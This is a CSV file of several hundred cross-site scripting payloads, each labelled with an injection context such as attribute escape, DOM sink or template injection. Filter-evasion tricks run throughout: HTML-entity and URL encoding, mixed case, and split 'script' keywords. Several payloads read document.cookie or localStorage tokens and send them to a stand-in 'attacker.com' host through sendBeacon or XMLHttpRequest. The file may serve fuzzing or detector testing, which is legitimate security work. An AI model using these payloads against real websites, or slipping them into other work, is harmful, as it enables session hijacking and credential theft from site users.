payload,context
%3Cmarquee	onscrollsnapchange=prompt(1)%3E,tag_injection
"' onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"Object.assign(window,{""onpageshow"":fetch})",dom_sink
'%3E%3Cimg src=x ongesturestart=prompt('XSS')%3E,attribute_escape
{{{alert(document.cookie)}}},template_injection
%22><img src=x onfocusin=console.log(location.hash)>,attribute_escape
ondragover=prompt/***/(location.hash),event_handler
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink
"""><img src=x onload=console.log(1)>",attribute_escape
"'><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"""><img src=x onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape
"%3Cxss src=x onanimationstart=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%3Cset/onfocus=prompt(document.domain)%3E,tag_injection
"%27 onpromptdismiss=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
<pl&#97;int&#101;xt onr&#101;p&#101;&#97;t=prompt('XSS') onr&#101;p&#101;&#97;t=prompt('XSS')>,tag_injection
"""><img src=x ontouchst&#97;rt=consol&#101;.log(1)>",attribute_escape
 onStaLleD=pRomPt(1),event_handler
<scr	ipt	>confirm(document.domain)</scr	ipt>,script_injection
<button ondragenter=\u0061lert(location.hash)>,tag_injection
<dialog	onpagehide=console.log(1)>,tag_injection
#s&#101;t($x='confirm('XSS')')$x,template_injection
<scr	ipt>Function('alert(document.domain)')();</scr	ipt>,script_injection
\%22 onsecuritypolicyviolation=prompt(1)//,attribute_escape
'><Img srC=x onBegIn=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape
"""><Img srC=x onWebKitAniMatIonEnd=prOmpT(1)>",attribute_escape
"onk&#101;ydown=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
\%27 ontouchstart=confirm(%27XSS%27)//,attribute_escape
%27 onload=console.log(1) %27,attribute_escape
%3Clink src=x oninput=alert(document.domain)%3E,tag_injection
<!--><MetA oNtrAnsItiOnsTarT=aLerT(lOcaTioN.hAsh)>,tag_injection
"j&#97;v&#97;
script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
"<math
onplaying=console.log('XSS')>",tag_injection
"%22><img src=x onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape
{{#with \u0061lert(1)}}...{{/with}},template_injection
%27 ><svg onended=console.log(1)>,attribute_escape
""" ><svG oNprOmpTdiSmiSs=ProMpt(doCumEnt.doMaiN)>",attribute_escape
JavAscRipT:pRomPt/**/(loCatIon.haSh),js_uri
`><img src=x oncontextmenu=alert(1)>,attribute_escape
<span src=x onsecuritypolicyviolation=alert(location.hash)>,tag_injection
<s&#101;t onfocus=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
%3Cxss x=y onmouseover=console.log('XSS')%3E,tag_injection
%22 onended=prompt(%27XSS%27) %22,attribute_escape
ontransitionrun=alert/**/(1),event_handler
"<scRipT>sEtTImeOut('aLerT(lOcaTioN.hAsh)',0)</scRipT>",script_injection
"document.querySelector(""body"").innerHTML+=""XMLHttpRequest(document.cookie)""",dom_sink
<td onwebkitanimationend=prompt(%27XSS%27) onwebkitanimationend=prompt(%27XSS%27)>,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>"")",dom_sink
"location=""javascript:XMLHttpRequest(document.cookie+'&loc='+location.href)""",dom_sink
\' OnbEfoRetOggLe=ConSolE.lOg('XSS')//,attribute_escape
"s&#101;tTim&#101;out(""confirm(docum&#101;nt.cooki&#101;)"",0)",dom_sink
' %3E%3Csvg ondrop=alert('XSS')%3E,attribute_escape
"' onkeydown=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
OnlOad=coNfiRm/**/(loCatIon.haSh),event_handler
"""><BasE oNpoIntEruP=aLerT(lOcaTioN.hAsh)>",tag_injection
<!--><AreA oNpaGesHow=prOmpT('XSS')>,tag_injection
"\' onpl&#97;y=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink
'><img src=x onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
' ><svg oncopy=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
<scr	ipt	>alert(1)</scr	ipt>,script_injection
""" oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
' oNgeStuReeNd=ProMpt(doCumEnt.doMaiN) ',attribute_escape
<set src=x onfocus=prompt(document.domain)>,tag_injection
<script	>alert(location.hash)</script>,script_injection
"""><img src=x onpagehide=confirm(1)>",attribute_escape
 onmousewheel=console.log('XSS'),event_handler
""" ><svg onpagereveal=\u0061lert(location.hash)>",attribute_escape
OndRagOveR=pRomPt(LocAtiOn.HasH),event_handler
"%22 ><svg onpromptdismiss=confirm(String.fromCharCode(88,83,83))>",attribute_escape
' ><svg onp&#97;g&#101;hid&#101;=confirm(1)>,attribute_escape
onp&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in),event_handler
"location=""javascript:console.log(document.cookie)""",dom_sink
"""><img src=x onreset=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
%3Cscript%3E/x/confirm(location.hash)%3C/script%3E,script_injection
"__proto__[""onlo&#97;d""]=&#101;v&#97;l(loc&#97;tion.h&#97;sh)",dom_sink
"document.write(""<img src=x onerror=confirm(String.fromCharCode(88,83,83))>"")",dom_sink
"s&#101;tTim&#101;out(""&#97;l&#101;rt('XSS')"",0)",dom_sink
"__proto__[""ontransitionrun""]=confirm(localStorage.getItem('token'))",dom_sink
<tr/onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"LocAtiOn.HreF=""JavAscRipT:pRomPt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))""",dom_sink
"""><img src=x onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
%22 ontouchmove=console.log(document.domain) %22,attribute_escape
%3C!--%3E%3Cselect onmousewheel=alert(document.domain)%3E,tag_injection
<maRquEe OnaUxcLicK=cOnfIrm(loCatIon.haSh) onAuxCliCk=ConFirM(lOcaTioN.hAsh)>,tag_injection
'%3E%3Cimg src=x ondrop=prompt('XSS')%3E,attribute_escape
'%3E%3Cimg src=x onpause=confirm('XSS')%3E,attribute_escape
"<script>s&#101;tTim&#101;out('confirm(1)',0)</script>",script_injection
%22><td onkeyup=confirm(document.domain)>,tag_injection
"<t&#101;mpl&#97;t&#101; x=y onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
&quot; onpageshow=console.log(%27XSS%27) x=&quot;,attribute_escape
"""%3E%3Cmath onmouseup=console.log(document.domain)%3E",tag_injection
"""%3E%3Ctemplate onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection
\' OnwEbkItfUllScrEenChaNge=alErt('XSS')//,attribute_escape
%3Cform src=x onwaiting=confirm(1)%3E,tag_injection
`><img src=x ondragenter=prompt(document.domain)>,attribute_escape
%3Cxss onmouseover=console.log('XSS')/%3E,tag_injection
"onpause=javascript:console.log(String.fromCharCode(88,83,83))",event_handler
"%3Cmath
ondragover=prompt(1)%3E",tag_injection
"\"" onclose=alert(document.domain)//",attribute_escape
"<script
>\u0061lert(location.hash)</script>",script_injection
"""%3E%3Cimg src=x onpointermove=alert(document.domain)%3E",attribute_escape
"__proto__[""onmouseover""]=console.log(location.hash)",dom_sink
"""><img src=x onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<xss	onmouseover=console.log('XSS')>,tag_injection
"""%3E%3Cimg src=x onpause=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"__proto__[""onvolum&#101;ch&#97;ng&#101;""]=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
JavAscRipT:cOnfIrm(1),js_uri
<script>Function(%27alert(%27XSS%27)%27)();</script>,script_injection
`><img src=x onbeforematch=confirm(location.hash)>,attribute_escape
%27 ><svg ondrop=confirm(document.domain)>,attribute_escape
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"%22><img src=x oncanplay=console.log(String.fromCharCode(88,83,83))>",attribute_escape
%22 onfocusout=console.log(location.hash) %22,attribute_escape
"""><img src=x onanimationcancel=prompt(location.hash)>",attribute_escape
onblur=javascript:console.log(1),event_handler
<t&#101;mpl&#97;t&#101; on&#101;nd&#101;d=prompt('XSS') on&#101;nd&#101;d=prompt('XSS')>,tag_injection
"\"" onplaying=alert(String.fromCharCode(88,83,83))//",attribute_escape
"__pRotO__[""oNpaGesWap""]=ProMpt(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
<listing src=x onkeyup=\u0061lert(location.hash)>,tag_injection
""" oNprOmpTacTioN=cOnsOle.loG('XSS') """,attribute_escape
%27 onwebkitanimationend=confirm(%27XSS%27) %27,attribute_escape
' ><svg onpause=confirm(document.domain)>,attribute_escape
"document.write(""%3Cimg src=x onerror=alert(document.cookie)%3E"")",dom_sink
"<!--><ifr&#97;m&#101; ong&#101;stur&#101;&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' %3E%3Csvg onpaste=console.log(document.domain)%3E,attribute_escape
OngOtpOinTerCapTurE=cOnsOle.loG&#40;'XSS'&#41;,event_handler
"\"" OncLosE=cOnsOle.loG(lOcaTioN.hAsh)//",attribute_escape
""" ons&#101;l&#101;ct=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
%22 ><svg ongesturestart=alert(location.hash)>,attribute_escape
\' onbeforepaste=console.log('XSS')//,attribute_escape
""" ><svg onpoint&#101;rup=&#97;l&#101;rt(1)>",attribute_escape
"<tr
onanimationend=prompt(%27XSS%27)>",tag_injection
"onclos&#101;=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"java
script:prompt(String.fromCharCode(88,83,83))",js_uri
%22 onpromptdismiss=prompt(document.domain) %22,attribute_escape
<dialog onplay=prompt(document.domain)/>,tag_injection
java	script:\u0061lert('XSS'),js_uri
"__proto__[""onw&#101;bkittr&#97;nsition&#101;nd""]=&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
' oNwhEel=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
{{$on.constructor(%27confirm(%27XSS%27)%27)()}},template_injection
onstalled=console.log/*x*/(1),event_handler
'><img src=x onwheel=alert('XSS')>,attribute_escape
 onFocUsiN=aLerT(1),event_handler
{{cOnsTruCtoR['ConStrUctOr']('ConFirM(dOcuMenT.dOmaIn)')()}},template_injection
' ><svG oNmoUseEntEr=AleRt(LocAtiOn.HasH)>,attribute_escape
onpagereveal=javascript:confirm(location.hash),event_handler
""" ><svg onb&#101;for&#101;copy=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
"LocAtiOn.HreF=""JavAscRipT:XMLHTtpReqUesT('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink
javascript:console.log/**/(1),js_uri
"Object.assign(window,{%22ongestureend%22:alert})",dom_sink
"ObjEct.asSigN(wIndOw,{""oNmoUseDowN"":XMLHttPReQueSt})",dom_sink
<animatemotion	onwaiting=alert(location.hash)>,tag_injection
%27 ><svg onerror=console.log(document.domain)>,attribute_escape
"onpointerover=prompt/*x*/(String.fromCharCode(88,83,83))",event_handler
'><Img srC=x onWebKitAniMatIonEnd=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
%3Canimatemotion/ondblclick=console.log(1)%3E,tag_injection
<t&#97;bl&#101; ons&#101;l&#101;ct=prompt(1) ons&#101;l&#101;ct=prompt(1)>,tag_injection
<scr	ipt>Function('confirm(document.domain)')();</scr	ipt>,script_injection
<script>/x/&#97;l&#101;rt('XSS')</script>,script_injection
"""><img src=x onbeforetoggle=console.log('XSS')>",attribute_escape
"document.body.innerHTML=""<img src=x onerror=confirm('//attacker.com/?c='+document.cookie)>""",dom_sink
&quot; onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
OnmOusEovEr=ConFirM(1),event_handler
\' onmozfullscreenchange=alert(1)//,attribute_escape
<scr	ipt>Function('alert(1)')();</scr	ipt>,script_injection
"<ifr&#97;m&#101;/ong&#101;stur&#101;&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" ongestureend=alert(1) """,attribute_escape
\%22 onpause=confirm(%27XSS%27)//,attribute_escape
"<td
onWebKitAniMatIonEnd=prOmpT('XSS')>",tag_injection
"eval(""prompt(document.cookie+'&loc='+location.href)"")",dom_sink
"ObjEct.asSigN(wIndOw,{""oNchAngE"":EvaL})",dom_sink
`%3E%3Cimg src=x onpagereveal=console.log(1)%3E,attribute_escape
"<xsS
oNanImaTioNstArt=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
""" ><svg on&#97;uxclick=consol&#101;.log(1)>",attribute_escape
"`%3E%3Cimg src=x ontouchstart=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
""" ><svg ondrop=&#97;l&#101;rt('XSS')>",attribute_escape
"<p onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection
"location=""javascript:prompt(btoa(document.cookie))""",dom_sink
 onload=alert(document.domain),event_handler
 onmous&#101;down=confirm(1),event_handler
' ><svG oNdrAgsTarT=cOnfIrm(1)>,attribute_escape
"""><Img srC=x onTraNsiTioNruN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
 onwheel=\u0061lert(1),event_handler
`><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"<scRipT>pRomPt`StrIng.frOmCHarCodE(88,83,83)`</sCriPt>",script_injection
"""%3E%3Cimg src=x onauxclick=alert(1)%3E",attribute_escape
"<m&#97;rqu&#101;&#101; onclos&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<select src=x onsecuritypolicyviolation=confirm(location.hash)>,tag_injection
\' OnmOusEwhEel=prOmpT('XSS')//,attribute_escape
"window[""prompt""](localStorage.getItem('token'))",dom_sink
"'><Img srC=x onSelEct=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
%3Cmtext src=x onfocusout=confirm(location.hash)%3E,tag_injection
onbeforepaste=confirm&#40;1&#41;,event_handler
<obj&#101;ct onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
"""><NosCriPt OnpOinTerDowN=pRomPt(DocUmeNt.DomAin)>",tag_injection
	onchange=alert(document.domain),event_handler
"javascript:confirm/*x*/(String.fromCharCode(88,83,83))",js_uri
"\"" onended=prompt(document.domain)//",attribute_escape
"<iframe	ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
"setTimeout(%22console.log(document.cookie+%27&loc=%27+location.href)%22,0)",dom_sink
"Object.assign(window,{%22onbeforepaste%22:confirm})",dom_sink
<template x=y onended=prompt('XSS')>,tag_injection
"__proto__[""onfocusout""]=prompt(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
"\"" OnpRomPtaCtiOn=ProMpt(1)//",attribute_escape
__proto__[%22onsecuritypolicyviolation%22]=confirm(location.hash),dom_sink
"__proto__[""oninput""]=\u0061lert(document.domain)",dom_sink
"	onPoiNteRovEr=AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler
' ontouchst&#97;rt=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
"eval(""confirm(String.fromCharCode(88,83,83))"")",dom_sink
<script	>&#97;l&#101;rt('XSS')</script>,script_injection
"SetTimEouT(""EvaL(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))"",0)",dom_sink
<img onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=confirm(1)>"")",dom_sink
<form onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
""" onmous&#101;ov&#101;r=confirm(loc&#97;tion.h&#97;sh) x=""",attribute_escape
`><img src=x ontoggle=console.log(1)>,attribute_escape
OneRroR=cOnsOle.loG/***/(loCatIon.haSh),event_handler
onsubmit=confirm/***/(docum&#101;nt.dom&#97;in),event_handler
"<p src=x onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" ><svg onp&#97;st&#101;=confirm('XSS')>",attribute_escape
document.body.innerHTML=%22<img src=x onerror=console.log(1)>%22,dom_sink
%27><img src=x onkeypress=alert(%27XSS%27)>,attribute_escape
"%22><img src=x onstalled=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"""%3E%3Cimg src=x onpointerdown=console.log(document.domain)%3E",attribute_escape
' ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
""" ><svg ontouchmov&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
`><img src=x onerror=alert(document.domain)>,attribute_escape
"<p/onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<!--><BasE oNgeStuReeNd=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
"(new Function(""fetch(String.fromCharCode(88,83,83))""))();",dom_sink
"' onload=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"${{'alert(document.domain)'.replace('alert(document.domain)','')}}",template_injection
'><Img srC=x onTouCheNd=ProMpt('XSS')>,attribute_escape
{{alert document.domain}},template_injection
&quot; onkeydown=alert(location.hash) x=&quot;,attribute_escape
{{constructor.constructor('confirm(1)')()}},template_injection
"onpoint&#101;rmov&#101;=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
&quot; onwebkitanimationend=confirm(%27XSS%27) x=&quot;,attribute_escape
onload=javascr	ipt:alert(document.domain),event_handler
`><img src=x onbeforecut=console.log(1)>,attribute_escape
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""f&#101;tch(docum&#101;nt.cooki&#101;)""",dom_sink
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>""",dom_sink
"<b&#97;s&#101;
oninput=&#97;l&#101;rt('XSS')>",tag_injection
"<ifr&#97;m&#101;	ong&#101;stur&#101;&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
&quOt; onMouSeoVer=coNfiRm('XSS') x=&quOt;,attribute_escape
"Object.assign(window,{""onanimationend"":prompt})",dom_sink
<mtext	onmousedown=console.log(1)>,tag_injection
<di&#97;log src=x on&#101;nd&#101;d=consol&#101;.log(1)>,tag_injection
<baSe X=y onBefOreCopY=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
"%27 ><svg onreset=alert(String.fromCharCode(88,83,83))>",attribute_escape
""" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.DomAin)""",dom_sink
onpoint&#101;rmov&#101;=&#97;l&#101;rt&#40;'XSS'&#41;,event_handler
' onreset=alert('XSS') ',attribute_escape
`><img src=x oncopy=consol&#101;.log(1)>,attribute_escape
' onpointerrawupdate=alert('XSS') ',attribute_escape
`><img src=x ong&#101;stur&#101;&#101;nd=prompt('XSS')>,attribute_escape
<image	onchange=\u0061lert(1)>,tag_injection
	onhashchange=\u0061lert('XSS'),event_handler
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tionit&#101;r&#97;tion"":f&#101;tch})",dom_sink
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=cOnfIrm('//atTacKer.coM/?C='+doCumEnt.coOkiE)>"")",dom_sink
&quOt; onGesTurEenD=cOnsOle.loG(lOcaTioN.hAsh) x=&qUot;,attribute_escape
"Object.assign(window,{""onend"":prompt})",dom_sink
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
%3Cform/ongesturestart=console.log('XSS')%3E,tag_injection
"\"" OnsCroLlsNapChaNge=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
<imG oNpaGesWap=coNsoLe.Log(1)/>,tag_injection
"""><base ontransitionstart=prompt(location.hash)>",tag_injection
""" ><svg on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
' on&#101;nd&#101;d=&#97;l&#101;rt('XSS') ',attribute_escape
"\"" oninput=\u0061lert(1)//",attribute_escape
{php}&#97;l&#101;rt(docum&#101;nt.cooki&#101;){/php},template_injection
""" %3E%3Csvg onselect=console.log(location.hash)%3E",attribute_escape
"	onfocus=prompt(String.fromCharCode(88,83,83))",event_handler
""" oNtoUchMovE=cOnsOle.loG('XSS') """,attribute_escape
' ><svg ondrop=confirm(1)>,attribute_escape
"location.href=""javascr	ipt:fetch('XSS')""",dom_sink
<template ondragenter=alert('XSS')>,tag_injection
<boDy OncLosE=cOnsOle.loG('XSS')>,tag_injection
' ><svg onsecuritypolicyviolation=console.log(document.domain)>,attribute_escape
'><Img srC=x onTouChmOve=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
onk&#101;ypr&#101;ss=prompt/***/(1),event_handler
onpopstate=javascr	ipt:confirm(1),event_handler
<!--><&#97;udio oninput=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
<template onended=prompt(%27XSS%27)>,tag_injection
j&#97;v&#97;	script:confirm('XSS'),js_uri
"JavA
sCriPt:ConSolE.lOg(LocAtiOn.HasH)",js_uri
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
"__proto__[%22onpaste%22]=confirm(String.fromCharCode(88,83,83))",dom_sink
""" ongestureend=\u0061lert(1) """,attribute_escape
<embed x=y onmouseenter=confirm(%27XSS%27)>,tag_injection
<&#101;mb&#101;d/onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
ondr&#97;gov&#101;r=confirm/*x*/('XSS'),event_handler
 onerror=confirm(1),event_handler
<title onmozfullscreenchange=prompt('XSS')/>,tag_injection
	ondragenter=prompt(document.domain),event_handler
%27><img src=x ontransitionrun=console.log(%27XSS%27)>,attribute_escape
 onAniMatIonStaRt=AleRt('XSS'),event_handler
""" onwebkitfullscreenchange=\u0061lert('XSS') """,attribute_escape
"<scRipT>FUncTioN('ConFirM(STriNg.FroMChArCOde(88,83,83))')();</ScrIpt>",script_injection
""" ><svG oNinValId=ConFirM(1)>",attribute_escape
'><Img srC=x onScrOllEnd=prOmpT(lOcaTioN.hAsh)>,attribute_escape
<%= alert document.cookie %>,template_injection
%22 ><svg oncopy=confirm(location.hash)>,attribute_escape
"<ifRamE oNtoUchStaRt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
' onr&#101;s&#101;t=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
<tr ons&#101;l&#101;ct=consol&#101;.log(1) ons&#101;l&#101;ct=consol&#101;.log(1)>,tag_injection
"location=""javascript:fetch(localStorage.getItem('token'))""",dom_sink
"SetIntErvAl(""alErt(1)"",100)",dom_sink
<meta src=x ontransitionstart=\u0061lert(location.hash)>,tag_injection
"OnbEfoRetOggLe=JavAscRipT:cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"\"" onkeydown=prompt('XSS')//",attribute_escape
"<blInk onPagEhiDe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
&quot; onend=confirm('XSS') x=&quot;,attribute_escape
<plaintext onpagereveal=\u0061lert(location.hash) onpagereveal=\u0061lert(location.hash)>,tag_injection
&quot; on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS') x=&quot;,attribute_escape
<scRipT>/X/aLerT(dOcuMenT.dOmaIn)</sCriPt>,script_injection
""" ><svg onvolumechange=alert(String.fromCharCode(88,83,83))>",attribute_escape
<!--><listing onpopstate=prompt(document.domain)>,tag_injection
&quot; onkeypress=alert(1) x=&quot;,attribute_escape
 onch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh),event_handler
"onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"""><img src=x onpointerrawupdate=\u0061lert(location.hash)>",attribute_escape
\%27 onsecuritypolicyviolation=prompt(1)//,attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(1)>%22)",dom_sink
' ondr&#97;gst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
\%22 onfocus=alert(1)//,attribute_escape
\' onpointerdown=\u0061lert(document.domain)//,attribute_escape
"__proto__[""on&#97;nim&#97;tionc&#97;nc&#101;l""]=&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
<template/ondragenter=alert('XSS')>,tag_injection
document.body.innerHTML=%22<img src=x onerror=eval(1)>%22,dom_sink
<obJecT/oNvoLumEchAngE=aLerT(1)>,tag_injection
	onk&#101;ydown=confirm('XSS'),event_handler
"Object.assign(window,{""ontouchstart"":\u0061lert})",dom_sink
""" oNanImaTioNenD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<source oninput=\u0061lert(location.hash)>,tag_injection
"\%22 onanimationstart=alert(String.fromCharCode(88,83,83))//",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=eval('XSS')%3E"")",dom_sink
<foRm OnpAgeHidE=cOnfIrm(1) onPagEhiDe=ConFirM(1)>,tag_injection
%3Cscript%3E/x/console.log(1)%3C/script%3E,script_injection
'><Img srC=x onMouSedOwn=coNsoLe.Log('XSS')>,attribute_escape
\%22 onpromptdismiss=console.log(%27XSS%27)//,attribute_escape
""" onbeforetoggle=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"\"" OnmOusEwhEel=coNsoLe.Log(1)//",attribute_escape
`><img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"document.write(""%3Cimg src=x onerror=fetch(document.cookie+'&loc='+location.href)%3E"")",dom_sink
"	ong&#101;stur&#101;&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
